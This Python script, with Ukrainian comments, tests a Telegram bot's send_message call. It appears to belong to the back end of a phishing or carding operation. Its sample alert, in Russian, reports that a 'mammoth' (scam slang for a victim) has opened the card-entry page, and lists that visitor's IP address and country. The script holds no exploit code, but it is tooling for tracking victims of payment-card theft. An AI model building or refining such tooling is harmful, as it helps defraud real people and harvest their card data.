#!/usr/bin/env python3
"""
Тест функції bot.send_message
"""

import asyncio
import sys
import os

# Додаємо поточну директорію до шляху для імпорту
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

async def test_bot_message():
    """Тестує функцію bot.send_message"""
    
    print("🧪 Тестування функції bot.send_message...")
    
    try:
        # Імпортуємо bot з main.py
        from main import bot
        
        # Тестовий admin_id (з бази даних)
        admin_id = 7855499159
        
        # Тестове повідомлення
        test_message = """🔔Мамонт открыл страницу (Ввод карты)

📎Страница: Ввод карты
#️⃣Ссылка: ?page=1-4
📶IP: 37.52.215.105
🌎Страна: UA"""
        
        print(f"📤 Відправляю тестове повідомлення адміну {admin_id}...")
        print(f"📝 Повідомлення:\n{test_message}")
        
        # Відправляємо повідомлення
        result = await bot.send_message(admin_id, test_message)
        
        print(f"✅ Повідомлення успішно відправлено!")
        print(f"📊 Результат: {result}")
        
    except ImportError as e:
        print(f"❌ Помилка імпорту: {e}")
        print("💡 Переконайтеся, що main.py доступний для імпорту")
    except Exception as e:
        print(f"❌ Помилка: {e}")
        print(f"🔍 Тип помилки: {type(e).__name__}")

if __name__ == "__main__":
    # Запускаємо асинхронну функцію
    asyncio.run(test_bot_message())
